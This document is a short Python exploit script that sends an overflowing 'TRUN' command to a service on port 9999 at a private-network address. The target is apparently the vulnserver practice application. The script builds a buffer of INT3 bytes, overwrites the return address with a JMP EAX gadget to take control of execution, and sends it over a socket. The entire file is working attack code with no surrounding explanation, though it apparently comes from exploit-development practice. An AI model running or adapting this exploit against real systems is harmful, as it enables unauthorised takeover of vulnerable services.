#!/usr/bin/python
import socket
import os
import sys

crash = "\xCC" * 2001 + "\x1C\x10\x40" + "\x00" + "C" * (5000 - 4 - 2003) # 0040101C - JMP EAX - we drop the last EIP NULL byte

buffer="TRUN A/.:A/"
buffer+= crash + "\r\n"
print "[*] Sending exploit!"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.100.120", 9999))
expl.send(buffer)
expl.close()

